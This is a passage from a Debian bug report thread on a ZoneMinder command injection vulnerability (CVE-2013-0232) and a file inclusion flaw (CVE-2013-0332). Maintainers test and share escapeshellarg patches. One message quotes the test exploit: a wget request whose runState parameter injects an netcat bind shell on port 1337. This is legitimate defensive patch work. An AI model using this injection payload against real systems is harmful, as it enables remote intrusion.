> +--- a/web/includes/functions.php
> ++++ b/web/includes/functions.php
> +@@ -905,7 +905,7 @@
> +
> + function packageControl( $command )
> + {
> +-    $string = ZM_PATH_BIN."/zmpkg.pl $command";
> ++    $string = ZM_PATH_BIN."/zmpkg.pl ".escapeshellarg( $command );
> +     $string .= " 2>/dev/null >&- <&- >/dev/null";
> +     exec( $string );
> + }
> +@@ -2145,7 +2145,8 @@
> +     else
> +     {
> +         // Can't connect so use script
> +-        $command = ZM_PATH_BIN."/zmx10.pl --command $status --unit-code $key";
> ++        $command = ZM_PATH_BIN.'/zmx10.pl --command '.escapeshellarg( $status );
> ++        $command .= ' --unit-code '.escapeshellarg( $key );
> +         //$command .= " 2>/dev/null >&- <&- >/dev/null";
> +         $x10Response = exec( $command );
> +     }

Security Team, how to proceed? Can/will a DSA be released for it?

Regards,
Salvatore

```
```
[[zoneminder_1.24.2-8+squeeze1.debdiff](bugreport.cgi?att=1;bug=698910;filename=zoneminder_1.24.2-8%2Bsqueeze1.debdiff;msg=35) (text/plain, attachment)]
```
```
[[zoneminder_1.25.0-3.1.debdiff](bugreport.cgi?att=2;bug=698910;filename=zoneminder_1.25.0-3.1.debdiff;msg=35) (text/plain, attachment)]
```
```
[[signature.asc](bugreport.cgi?att=3;bug=698910;filename=signature.asc;msg=35) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Peter Howard <pjh@northern-ridge.com.au>`:

`Bug#698910`; Package `src:zoneminder`.
(Mon, 11 Feb 2013 22:45:10 GMT) ([full text](bugreport.cgi?bug=698910;msg=37), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=37), [link](#36)).

---

**Acknowledgement sent**
to `Moritz Mühlenhoff <jmm@inutil.org>`:

Extra info received and forwarded to list. Copy sent to `Peter Howard <pjh@northern-ridge.com.au>`.
(Mon, 11 Feb 2013 22:45:10 GMT) ([full text](bugreport.cgi?bug=698910;msg=39), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=39), [link](#38)).

---

[Message #40](#40) received at 698910@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=40), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=40), reply):

![](/cgi-bin/libravatar.cgi?email=jmm%40inutil.org)
From: Moritz Mühlenhoff <jmm@inutil.org>
To: Salvatore Bonaccorso <carnil@debian.org>
Cc: James McCoy <jamessan@debian.org>, 698910@bugs.debian.org,
team@security.debian.org
Subject: Re: Bug#698910: zoneminder: arbitrary command execution vulnerability
Date: Mon, 11 Feb 2013 23:41:13 +0100
```
On Mon, Feb 11, 2013 at 11:03:32PM +0100, Salvatore Bonaccorso wrote:
> Hi
>
> On Sun, Feb 10, 2013 at 10:25:27AM -0500, James McCoy wrote:
> > On Sun, Jan 27, 2013 at 05:43:13PM +0100, Salvatore Bonaccorso wrote:
> > > Some additional information: In most usual cases where zoneminder is
> > > set up, there should be authentication first. So this limits somehow
> > > the vulnerability.
> >
> > The attached patch should address the issue, but I don't have a setup to
> > test.
>
> The patches look they address the issue mentioned. What I've done:
>
>  - Build both for Squeeze and unstable (debdiffs attached)
>
> - Installed zoneminder in a VM, confirmed that for both stable and
>    unstable version zoneminder is vulnerable.
>
> - Installed the patched packages to verifiy the vulnerability.
>
> NOTE: I was not able to test setDeviceStatusX10 part, but the code fix
> is going the same by James:
>
> Security Team, how to proceed? Can/will a DSA be released for it?

We should fix this in a DSA.

Vagrant, James or Peter, can you do real-world testing of the proposed squeeze
package?

Cheers,
        Moritz

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org`:

`Bug#698910`; Package `src:zoneminder`.
(Mon, 11 Feb 2013 22:51:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=42), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=42), [link](#41)).

---

**Acknowledgement sent**
to `Peter Howard <pjh@northern-ridge.com.au>`:

Extra info received and forwarded to list.
(Mon, 11 Feb 2013 22:51:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=44), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=44), [link](#43)).

---

[Message #45](#45) received at 698910@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=45), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=45), reply):

![](/cgi-bin/libravatar.cgi?email=pjh%40northern-ridge.com.au)
From: Peter Howard <pjh@northern-ridge.com.au>
To: Salvatore Bonaccorso <carnil@debian.org>, 698910@bugs.debian.org
Cc: James McCoy <jamessan@debian.org>, team@security.debian.org
Subject: Re: Bug#698910: zoneminder: arbitrary command execution
vulnerability
Date: Tue, 12 Feb 2013 09:41:46 +1100
```
[[Message part 1](bugreport.cgi?att=0;bug=698910;msg=45) (text/plain, inline)]
```
```
On Mon, 2013-02-11 at 23:03 +0100, Salvatore Bonaccorso wrote:
> Hi
>
> On Sun, Feb 10, 2013 at 10:25:27AM -0500, James McCoy wrote:
> > On Sun, Jan 27, 2013 at 05:43:13PM +0100, Salvatore Bonaccorso wrote:
> > > Some additional information: In most usual cases where zoneminder is
> > > set up, there should be authentication first. So this limits somehow
> > > the vulnerability.
> >
> > The attached patch should address the issue, but I don't have a setup to
> > test.
>
> The patches look they address the issue mentioned. What I've done:
>
>  - Build both for Squeeze and unstable (debdiffs attached)
>
> - Installed zoneminder in a VM, confirmed that for both stable and
>    unstable version zoneminder is vulnerable.
>
> - Installed the patched packages to verifiy the vulnerability.
>
> NOTE: I was not able to test setDeviceStatusX10 part, but the code fix
> is going the same by James:
>
> > +--- a/web/includes/functions.php
> > ++++ b/web/includes/functions.php
> > +@@ -905,7 +905,7 @@
> > +
> > + function packageControl( $command )
> > + {
> > +-    $string = ZM_PATH_BIN."/zmpkg.pl $command";
> > ++    $string = ZM_PATH_BIN."/zmpkg.pl ".escapeshellarg( $command );
> > +     $string .= " 2>/dev/null >&- <&- >/dev/null";
> > +     exec( $string );
> > + }
> > +@@ -2145,7 +2145,8 @@
> > +     else
> > +     {
> > +         // Can't connect so use script
> > +-        $command = ZM_PATH_BIN."/zmx10.pl --command $status --unit-code $key";
> > ++        $command = ZM_PATH_BIN.'/zmx10.pl --command '.escapeshellarg( $status );
> > ++        $command .= ' --unit-code '.escapeshellarg( $key );
> > +         //$command .= " 2>/dev/null >&- <&- >/dev/null";
> > +         $x10Response = exec( $command );
> > +     }
>
> Security Team, how to proceed? Can/will a DSA be released for it?
>

Better late than never . . .

Sorry for leaving this (zoneminder has slipped down my focus list in
recent times) . . . I can apply the patch to the (debian) zoneminder
repo and have an updated package out quickly.  However I've never had
upload rights; I've always gone through an intermediary for the final
upload.  So what's the easiest way forward - I just get it uploaded in
my normal way, I leave it for a security release, or "other"?

Also, I assume I need to get an updated 1.24.2 release too?

> Regards,
> Salvatore

--
Peter Howard <pjh@northern-ridge.com.au>

```
```
[[signature.asc](bugreport.cgi?att=1;bug=698910;filename=signature.asc;msg=45) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Peter Howard <pjh@northern-ridge.com.au>`:

`Bug#698910`; Package `src:zoneminder`.
(Mon, 11 Feb 2013 23:33:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=47), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=47), [link](#46)).

---

**Acknowledgement sent**
to `Vagrant Cascadian <vagrant@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Peter Howard <pjh@northern-ridge.com.au>`.
(Mon, 11 Feb 2013 23:33:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=49), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=49), [link](#48)).

---

[Message #50](#50) received at 698910@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=50), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=50), reply):

![](/cgi-bin/libravatar.cgi?email=vagrant%40debian.org)
From: Vagrant Cascadian <vagrant@debian.org>
To: Moritz MÃ¼hlenhoff <jmm@inutil.org>,
698910@bugs.debian.org
Cc: Salvatore Bonaccorso <carnil@debian.org>,
James McCoy <jamessan@debian.org>, team@security.debian.org,
Peter Howard <pjh@northern-ridge.com.au>
Subject: Re: Bug#698910: zoneminder: arbitrary command execution
vulnerability
Date: Mon, 11 Feb 2013 15:29:05 -0800
```
On Mon, Feb 11, 2013 at 11:41:13PM +0100, Moritz Mühlenhoff wrote:
> On Mon, Feb 11, 2013 at 11:03:32PM +0100, Salvatore Bonaccorso wrote:
> > On Sun, Feb 10, 2013 at 10:25:27AM -0500, James McCoy wrote:
> > > On Sun, Jan 27, 2013 at 05:43:13PM +0100, Salvatore Bonaccorso wrote:
...
> > The patches look they address the issue mentioned. What I've done:
> >
> >  - Build both for Squeeze and unstable (debdiffs attached)
> >
> > - Installed zoneminder in a VM, confirmed that for both stable and
> >    unstable version zoneminder is vulnerable.
> >
> > - Installed the patched packages to verifiy the vulnerability.
> >
> > NOTE: I was not able to test setDeviceStatusX10 part, but the code fix
> > is going the same by James:
> >
> > Security Team, how to proceed? Can/will a DSA be released for it?
>
> We should fix this in a DSA.
>
> Vagrant, James or Peter, can you do real-world testing of the proposed squeeze
> package?

I should be able to dedicate some time to testing on squeeze and wheezy and
hopefully upload tomorrow, although I don't have a setup where I can test the
setDeviceStatusX10 part either.

Peter, if you have some time to get the VCS repository ready and do some
testing, I'd be more confident in being able to upload.

Thanks everyone for the looking into this issue, and especially the patch.

live well,
  vagrant

```

---

**Reply sent**
to `Peter Howard <pjh@northern-ridge.com.au>`:

You have taken responsibility.
(Tue, 12 Feb 2013 20:51:04 GMT) ([full text](bugreport.cgi?bug=698910;msg=52), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=52), [link](#51)).

---

**Notification sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Bug acknowledged by developer.
(Tue, 12 Feb 2013 20:51:04 GMT) ([full text](bugreport.cgi?bug=698910;msg=54), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=54), [link](#53)).

---

[Message #55](#55) received at 698910-close@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=55), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=55), reply):

![](/cgi-bin/libravatar.cgi?email=pjh%40northern-ridge.com.au)
From: Peter Howard <pjh@northern-ridge.com.au>
To: 698910-close@bugs.debian.org
Subject: Bug#698910: fixed in zoneminder 1.25.0-4
Date: Tue, 12 Feb 2013 20:48:51 +0000
```
Source: zoneminder
Source-Version: 1.25.0-4

We believe that the bug you reported is fixed in the latest version of
zoneminder, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 698910@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Peter Howard <pjh@northern-ridge.com.au> (supplier of updated zoneminder package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Format: 1.8
Date: Tue, 12 Jun 2013 12:02:10 +1000
Source: zoneminder
Binary: zoneminder
Architecture: source i386
Version: 1.25.0-4
Distribution: unstable
Urgency: high
Maintainer: Peter Howard <pjh@northern-ridge.com.au>
Changed-By: Peter Howard <pjh@northern-ridge.com.au>
Description:
 zoneminder - Linux video camera security and surveillance solution
Closes: [698910](bugreport.cgi?bug=698910)
Changes:
 zoneminder (1.25.0-4) unstable; urgency=high
 .
   * Add [CVE-2013-0232](https://security-tracker.debian.org/tracker/CVE-2013-0232) patch
     [SECURITY] [CVE-2013-0232](https://security-tracker.debian.org/tracker/CVE-2013-0232): Shell escape commands with untrusted content.
     Thanks to James McCoy <jamessan@debian.org> (Closes: #[698910](bugreport.cgi?bug=698910))
     Thanks also to Salvatore Bonaccorso <carnil@debian.org>
Checksums-Sha1:
 24d52e754f16893c5e77ea0017da324881541344 2220 zoneminder_1.25.0-4.dsc
 b4fc7d566a9858b2b99fc8ae634848e4e84e073b 13809 zoneminder_1.25.0-4.debian.tar.gz
 6cdf453c884f85a9fe6ddcbbf250884c8afd1748 1906622 zoneminder_1.25.0-4_i386.deb
Checksums-Sha256:
 a30c94dd96c0ac3c1b9127263fa81f6d0e96ef7b048b6cbb0b923532c78cd59b 2220 zoneminder_1.25.0-4.dsc
 03a655a9a3af5dbec2612a99041ab16639556c660ecddad526def49ef1b1cc0d 13809 zoneminder_1.25.0-4.debian.tar.gz
 dbd70731bfe632b5e8fc210f5608c47b32c25bbd90746a838e34387dcda41c25 1906622 zoneminder_1.25.0-4_i386.deb
Files:
 f7c61ec1053b5a8984fbe268c6e48561 2220 net optional zoneminder_1.25.0-4.dsc
 8bdab9d4255711d0bd4ceafec9779dd0 13809 net optional zoneminder_1.25.0-4.debian.tar.gz
 9bbc8a61a11fc4665e9d917de3518068 1906622 net optional zoneminder_1.25.0-4_i386.deb

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)

iQIcBAEBCgAGBQJRGp2rAAoJELeLgtSBS5G2kLgQAIJq88uregRlbv/10WAAAtHj
Z9YqZiBXWffvP1ed1J9kD3DojvboQ6ewyDbfyFRS0UqMCbJvy70Qbqqj7U9fZANW
hGn60c6XWZyNDxGW8gGQwWez3EcU3s6LrJqIbdFnKNHz1ljCabXU7tXIcWB6k6wn
igz8qUdC0ZYGMgOxOyCXZ/qMv+lj+wFy7ee3JwE7dZfzsmh45Je3+rl8RCPyeZkh
SZB1DyIAq4HSn1JIkauSBJXHn0Jhzafem71iVJdA0F7SaN1VzQRY5POZ8xtM3V+x
CVJIk/n1p/Gg/8OpgWOF9/JgcmL8t1I69b6xPl5k0XtufIVtR9j2zVzK7oOnXMhU
xrNxdPGqobOBUM/qnVJ6+tsc6ydp0t8iZOpVESxKW3kIFPFDRldTLz/7+1oBSLpi
/A1s8dTdw451KoVH33c32j5lgZwcYWQD0xN1KZYRR8B45vTuIsrpb4c3KjSH0go+
WUdoBHDGa7JVPxky7Y28+wH044ORleqrOy9kucvtBudRF00BdGpl7UUvemmoTGCi
vrxDq1Y649btnRK0azEyGBtkatGgmrWfD+ddmxE2/td1ShIPKMuZyBt2FQjSzdvn
pQMapYguU0jotvniiw4SBgUP47q3L9aNg6lawjt+yTgD3ieroODDWTfFjzzHiB9h
iy0CyGr067FqOOOJkUDG
=TrZb
-----END PGP SIGNATURE-----

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Peter Howard <pjh@northern-ridge.com.au>`:

`Bug#698910`; Package `src:zoneminder`.
(Thu, 14 Feb 2013 19:39:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=57), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=57), [link](#56)).

---

**Acknowledgement sent**
to `Vagrant Cascadian <vagrant@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Peter Howard <pjh@northern-ridge.com.au>`.
(Thu, 14 Feb 2013 19:39:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=59), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=59), [link](#58)).

---

[Message #60](#60) received at 698910@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=60), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=60), reply):

![](/cgi-bin/libravatar.cgi?email=vagrant%40debian.org)
From: Vagrant Cascadian <vagrant@debian.org>
To: 698910@bugs.debian.org
Cc: Moritz MÃ¼hlenhoff <jmm@inutil.org>,
team@security.debian.org, Peter Howard <pjh@northern-ridge.com.au>
Subject: Re: Bug#698910: zoneminder: arbitrary command execution
vulnerability
Date: Thu, 14 Feb 2013 11:35:31 -0800
```
On Mon, Feb 11, 2013 at 03:29:05PM -0800, Vagrant Cascadian wrote:
> On Mon, Feb 11, 2013 at 11:41:13PM +0100, Moritz Mühlenhoff wrote:
> > On Mon, Feb 11, 2013 at 11:03:32PM +0100, Salvatore Bonaccorso wrote:
> > > On Sun, Feb 10, 2013 at 10:25:27AM -0500, James McCoy wrote:
> > > > On Sun, Jan 27, 2013 at 05:43:13PM +0100, Salvatore Bonaccorso wrote:

> > > Security Team, how to proceed? Can/will a DSA be released for it?
> >
> > We should fix this in a DSA.
> >
> > Vagrant, James or Peter, can you do real-world testing of the proposed squeeze
> > package?
>
> I should be able to dedicate some time to testing on squeeze and wheezy and
> hopefully upload tomorrow, although I don't have a setup where I can test the
> setDeviceStatusX10 part either.

Should already be fixed in sid, and soon hit wheezy.

I've prepared a security update for squeeze.

I've manually tested the security exploit described at:

  <http://itsecuritysolutions.org/2013-01-22-ZoneMinder-Video-Server-arbitrary-command-execution-vulnerability/>

Using:

  wget -O - '<http://127.0.0.1/zm/index.php?view=none&action=state&runState=start;nc+-l+-p+1337+-e+/bin/sh%26>'

Which allowed a shell accessible via netcat on port 1337 with the version
present in squeeze (1.24.2-8).

With a package built with the patch applied, I was not able to reproduce this
problem. I haven't noticed any side-effects, running on a couple zoneminder
machines for almost 24 hours...

diff -Nru zoneminder-1.24.2/debian/changelog zoneminder-1.24.2/debian/changelog
--- zoneminder-1.24.2/debian/changelog	2011-01-15 19:40:08.000000000 -0800
+++ zoneminder-1.24.2/debian/changelog	2013-02-13 16:04:34.000000000 -0800
@@ -1,3 +1,12 @@
+zoneminder (1.24.2-8+squeeze1) stable-security; urgency=high
+
+  * Add [CVE-2013-0232](https://security-tracker.debian.org/tracker/CVE-2013-0232) patch
+    [SECURITY] [CVE-2013-0232](https://security-tracker.debian.org/tracker/CVE-2013-0232): Shell escape commands with untrusted content.
+    Thanks to James McCoy <jamessan@debian.org> (Closes: #[698910](bugreport.cgi?bug=698910))
+    Thanks also to Salvatore Bonaccorso <carnil@debian.org>
+
+ -- Vagrant Cascadian <vagrant@debian.org>  Wed, 13 Feb 2013 15:49:34 -0800
+
 zoneminder (1.24.2-8) unstable; urgency=medium

   [ Vagrant Cascadian ]
diff -Nru zoneminder-1.24.2/debian/patches/cve-2013-0232 zoneminder-1.24.2/debian/patches/cve-2013-0232
--- zoneminder-1.24.2/debian/patches/cve-2013-0232	1969-12-31 16:00:00.000000000 -0800
+++ zoneminder-1.24.2/debian/patches/cve-2013-0232	2013-02-13 15:43:30.000000000 -0800
@@ -0,0 +1,24 @@
+From: James McCoy <jamessan@debian.org>
+Bug-Debian: <http://bugs.debian.org/698910>
+Subject: shell escape commands with untrusted content
+--- a/web/includes/functions.php
++++ b/web/includes/functions.php
+@@ -905,7 +905,7 @@
+
+ function packageControl( $command )
+ {
+-    $string = ZM_PATH_BIN."/zmpkg.pl $command";
++    $string = ZM_PATH_BIN."/zmpkg.pl ".escapeshellarg( $command );
+     $string .= " 2>/dev/null >&- <&- >/dev/null";
+     exec( $string );
+ }
+@@ -2145,7 +2145,8 @@
+     else
+     {
+         // Can't connect so use script
+-        $command = ZM_PATH_BIN."/zmx10.pl --command $status --unit-code $key";
++        $command = ZM_PATH_BIN.'/zmx10.pl --command '.escapeshellarg( $status );
++        $command .= ' --unit-code '.escapeshellarg( $key );
+         //$command .= " 2>/dev/null >&- <&- >/dev/null";
+         $x10Response = exec( $command );
+     }
diff -Nru zoneminder-1.24.2/debian/patches/series zoneminder-1.24.2/debian/patches/series
--- zoneminder-1.24.2/debian/patches/series	2011-01-14 12:01:53.000000000 -0800
+++ zoneminder-1.24.2/debian/patches/series	2013-02-13 15:46:26.000000000 -0800
@@ -7,3 +7,4 @@
 suppported-typo
 use_libjs-mootools
 fix_v4l2_cameras_without_crop
+cve-2013-0232

Anything more needed for the security team? Which queue should it be uploaded
to?

live well,
  vagrant

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Peter Howard <pjh@northern-ridge.com.au>`:

`Bug#698910`; Package `src:zoneminder`.
(Fri, 15 Feb 2013 20:09:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=62), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=62), [link](#61)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Peter Howard <pjh@northern-ridge.com.au>`.
(Fri, 15 Feb 2013 20:09:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=64), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=64), [link](#63)).

---

[Message #65](#65) received at 698910@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=65), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=65), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: Vagrant Cascadian <vagrant@debian.org>, 698910@bugs.debian.org
Cc: Moritz MÃ¼hlenhoff <jmm@inutil.org>,
team@security.debian.org, Peter Howard <pjh@northern-ridge.com.au>
Subject: Re: Bug#698910: zoneminder: arbitrary command execution
vulnerability
Date: Fri, 15 Feb 2013 21:05:08 +0100
```
Hi

(Hmm, strange I have not recieved this followup)

On Thu, Feb 14, 2013 at 11:35:31AM -0800, Vagrant Cascadian wrote:
> Which allowed a shell accessible via netcat on port 1337 with the version
> present in squeeze (1.24.2-8).
>
> With a package built with the patch applied, I was not able to reproduce this
> problem. I haven't noticed any side-effects, running on a couple zoneminder
> machines for almost 24 hours...

I can confirm this, I did the same on my testing. (but as said I was
not able to test the setDeviceStatusX10 part, but is fixed with same
approach).

Regards,
Salvatore

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Peter Howard <pjh@northern-ridge.com.au>`:

`Bug#698910`; Package `src:zoneminder`.
(Mon, 25 Feb 2013 11:33:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=67), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=67), [link](#66)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Peter Howard <pjh@northern-ridge.com.au>`.
(Mon, 25 Feb 2013 11:33:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=69), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=69), [link](#68)).

---

[Message #70](#70) received at 698910@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=70), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=70), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: Vagrant Cascadian <vagrant@debian.org>, 698910@bugs.debian.org
Cc: Moritz MÃ¼hlenhoff <jmm@inutil.org>,
team@security.debian.org, Peter Howard <pjh@northern-ridge.com.au>,
700912@bugs.debian.org
Subject: Re: Bug#698910: zoneminder: arbitrary command execution
vulnerability
Date: Mon, 25 Feb 2013 12:28:33 +0100
```
Hi Vagrant and Peter

On Thu, Feb 14, 2013 at 11:35:31AM -0800, Vagrant Cascadian wrote:
> Anything more needed for the security team? Which queue should it be
> uploaded to?

Apologies for the delay. Could you also adress #700912 ([CVE-2013-0332](https://security-tracker.debian.org/tracker/CVE-2013-0332))
for the stable-security update.

I think we can proceed afterwards.

Thank you for preparing updated packages!

Regards,
Salvatore

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Peter Howard <pjh@northern-ridge.com.au>`:

`Bug#698910`; Package `src:zoneminder`.
(Wed, 27 Feb 2013 01:45:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=72), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=72), [link](#71)).

---

**Acknowledgement sent**
to `Vagrant Cascadian <vagrant@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Peter Howard <pjh@northern-ridge.com.au>`.
(Wed, 27 Feb 2013 01:45:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=74), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=74), [link](#73)).

---

[Message #75](#75) received at 698910@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=75), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=75), reply):

![](/cgi-bin/libravatar.cgi?email=vagrant%40debian.org)
From: Vagrant Cascadian <vagrant@debian.org>
To: Salvatore Bonaccorso <carnil@debian.org>
Cc: 698910@bugs.debian.org,
Moritz MÃ¼hlenhoff <jmm@inutil.org>,
team@security.debian.org, Peter Howard <pjh@northern-ridge.com.au>,
700912@bugs.debian.org
Subject: Re: Bug#698910: zoneminder: arbitrary command execution
vulnerability
Date: Tue, 26 Feb 2013 17:41:52 -0800
```
On Mon, Feb 25, 2013 at 12:28:33PM +0100, Salvatore Bonaccorso wrote:
> On Thu, Feb 14, 2013 at 11:35:31AM -0800, Vagrant Cascadian wrote:
> > Anything more needed for the security team? Which queue should it be
> > uploaded to?
>
> Apologies for the delay. Could you also adress #700912 ([CVE-2013-0332](https://security-tracker.debian.org/tracker/CVE-2013-0332))
> for the stable-security update.
>
> I think we can proceed afterwards.

I've prepared an upload in the "squeeze" branch of the hg repository, which
required a little backporting of the patches, but haven't yet tested it... hope
to test tomorrow, or I may not get to it till the following week...

  <http://anonscm.debian.org/hg/collab-maint/zoneminder/>

or a debdiff:

diff -Nru zoneminder-1.24.2/debian/changelog zoneminder-1.24.2/debian/changelog
--- zoneminder-1.24.2/debian/changelog  2011-01-15 19:40:08.000000000 -0800
+++ zoneminder-1.24.2/debian/changelog  2013-02-26 17:20:05.000000000 -0800
@@ -1,3 +1,15 @@
+zoneminder (1.24.2-8+squeeze1) UNRELEASED; urgency=high
+
+  * Add [CVE-2013-0232](https://security-tracker.debian.org/tracker/CVE-2013-0232) patch
+    [SECURITY] [CVE-2013-0232](https://security-tracker.debian.org/tracker/CVE-2013-0232): Shell escape commands with untrusted content.
+    Thanks to James McCoy <jamessan@debian.org> (Closes: #[698910](bugreport.cgi?bug=698910))
+    Thanks also to Salvatore Bonaccorso <carnil@debian.org>
+  * Add [CVE-2013-0332](https://security-tracker.debian.org/tracker/CVE-2013-0332) patch
+    [SECURITY] [CVE-2013-0332](https://security-tracker.debian.org/tracker/CVE-2013-0332): local file inclusion (Closes: #[700912](bugreport.cgi?bug=700912)).
+    Thanks to Salvatore Bonaccorso <carnil@debian.org> for the patch.
+
+ -- Vagrant Cascadian <vagrant@debian.org>  Tue, 26 Feb 2013 17:20:02 -0800
+
 zoneminder (1.24.2-8) unstable; urgency=medium

   [ Vagrant Cascadian ]
diff -Nru zoneminder-1.24.2/debian/patches/cve-2013-0232 zoneminder-1.24.2/debian/patches/cve-2013-0232
--- zoneminder-1.24.2/debian/patches/cve-2013-0232      1969-12-31 16:00:00.000000000 -0800
+++ zoneminder-1.24.2/debian/patches/cve-2013-0232      2013-02-26 16:55:03.000000000 -0800
@@ -0,0 +1,24 @@
+From: James McCoy <jamessan@debian.org>
+Bug-Debian: <http://bugs.debian.org/698910>
+Subject: shell escape commands with untrusted content
+--- a/web/includes/functions.php
++++ b/web/includes/functions.php
+@@ -905,7 +905,7 @@
+
+ function packageControl( $command )
+ {
+-    $string = ZM_PATH_BIN."/zmpkg.pl $command";
++    $string = ZM_PATH_BIN."/zmpkg.pl ".escapeshellarg( $command );
+     $string .= " 2>/dev/null >&- <&- >/dev/null";
+     exec( $string );
+ }
+@@ -2145,7 +2145,8 @@
+     else
+     {
+         // Can't connect so use script
+-        $command = ZM_PATH_BIN."/zmx10.pl --command $status --unit-code $key";
++        $command = ZM_PATH_BIN.'/zmx10.pl --command '.escapeshellarg( $status );
++        $command .= ' --unit-code '.escapeshellarg( $key );
+         //$command .= " 2>/dev/null >&- <&- >/dev/null";
+         $x10Response = exec( $command );
+     }
diff -Nru zoneminder-1.24.2/debian/patches/cve-2013-0332 zoneminder-1.24.2/debian/patches/cve-2013-0332
--- zoneminder-1.24.2/debian/patches/cve-2013-0332      1969-12-31 16:00:00.000000000 -0800
+++ zoneminder-1.24.2/debian/patches/cve-2013-0332      2013-02-26 17:18:18.000000000 -0800
@@ -0,0 +1,71 @@
+From: Salvatore Bonaccorso <carnil@debian.org>
+Bug-Debian: <http://bugs.debian.org/700912>
+Subject: [CVE-2013-0332](https://security-tracker.debian.org/tracker/CVE-2013-0332): local file inclusion vulnerability
+Bug-Upstream: <http://www.zoneminder.com/forums/viewtopic.php?f=1&t=17979>
+
+Backported r3483 and r3488 from upstream svn to fix [CVE-2013-0332](https://security-tracker.debian.org/tracker/CVE-2013-0332).
+
+Index: zoneminder/web/includes/functions.php
+===================================================================
+--- zoneminder.orig/web/includes/functions.php 2013-02-26 17:07:02.000000000 -0800
++++ zoneminder/web/includes/functions.php      2013-02-26 17:08:10.806977380 -0800
+@@ -2231,13 +2231,21 @@
+     return( rand( 1, 999999 ) );
+ }
+
++function detaintPath( $path )
++{
++    // Remove any absolute paths, or relative ones that want to go up
++    $path = preg_replace( '/\.\.+\/\/*/', '', $path );
++    $path = preg_replace( '/^\/\/*/', '', $path );
++    return( $path );
++}
++
+ function getSkinFile( $file )
+ {
+     global $skinBase;
+     $skinFile = false;
+     foreach ( $skinBase as $skin )
+     {
+-        $tempSkinFile = 'skins'.'/'.$skin.'/'.$file;
++        $tempSkinFile = detaintPath( 'skins'.'/'.$skin.'/'.$file );
+         if ( file_exists( $tempSkinFile ) )
+             $skinFile = $tempSkinFile;
+     }
+@@ -2250,7 +2258,7 @@
+     $skinFile = false;
+     foreach ( $skinBase as $skin )
+     {
+-        $tempSkinFile = 'skins'.'/'.$skin.'/'.$file;
++        $tempSkinFile = detaintPath( 'skins'.'/'.$skin.'/'.$file );
+         if ( file_exists( $tempSkinFile ) )
+             $skinFile = $tempSkinFile;
+     }
+Index: zoneminder/web/index.php
+===================================================================
+--- zoneminder.orig/web/index.php      2013-02-26 16:55:04.000000000 -0800
++++ zoneminder/web/index.php   2013-02-26 17:13:03.376428137 -0800
+@@ -96,10 +96,13 @@
+ require_once( 'includes/functions.php' );
+
+ if ( isset($_REQUEST['view']) )
